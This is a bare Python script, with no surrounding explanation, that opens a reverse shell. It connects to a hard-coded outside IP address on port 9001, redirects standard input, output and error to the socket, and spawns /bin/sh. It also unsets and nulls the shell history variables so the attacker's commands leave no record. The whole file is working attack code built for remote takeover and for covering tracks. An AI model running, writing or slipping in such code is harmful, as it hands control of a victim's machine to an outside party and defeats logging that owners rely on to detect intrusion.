# -*- coding:utf-8 -*-
#!/usr/bin/env python

import os,socket,pty,time
shell = "/bin/sh"

def main():
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		s.connect(('106.13.59.8',9001))
		print ('connect ok')
	except:
		print ('connect faild')
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.unsetenv("HISTFILE")
	os.unsetenv("HISTFILESIZE")
	os.unsetenv("HISTSIZE")
	os.unsetenv("HISTORY")
	os.unsetenv("HISTSAVE")
	os.unsetenv("HISTZONE")
	os.unsetenv("HISTLOG")
	os.unsetenv("HISTCMD")
	os.putenv("HISTFILE",'/dev/null')
	os.putenv("HISTSIZE",'0')
	os.putenv("HISTFILESIZE",'0')
	pty.spawn(shell)
	s.close()
if __name__ == '__main__':
    main()
		
